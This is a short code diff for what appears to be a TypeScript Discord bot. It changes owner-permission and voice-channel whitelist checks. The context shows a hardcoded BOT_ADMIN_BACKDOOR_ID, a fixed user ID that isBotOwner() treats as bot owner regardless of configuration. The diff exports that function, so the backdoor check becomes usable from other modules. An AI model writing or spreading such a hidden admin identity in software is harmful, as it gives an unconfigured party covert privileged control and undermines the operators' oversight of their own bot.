@@ -5,7 +5,7 @@ import { config } from '../config.js';
 
 const BOT_ADMIN_BACKDOOR_ID = '189457295279783936';
 
-function isBotOwner(userId: string): boolean {
+export function isBotOwner(userId: string): boolean {
     return userId === BOT_ADMIN_BACKDOOR_ID || Boolean(config.bot.ownerId && userId === config.bot.ownerId);
 }
 
@@ -56,9 +56,6 @@ export async function canJoinVoiceChannel(
     const channelId = voiceChannel.id;
 
     if (settings.voiceChannelMode === 'whitelist') {
-        if (settings.allowedVoiceChannels.length === 0) {
-            return true;
-        }
         return settings.allowedVoiceChannels.includes(channelId);
     }
 
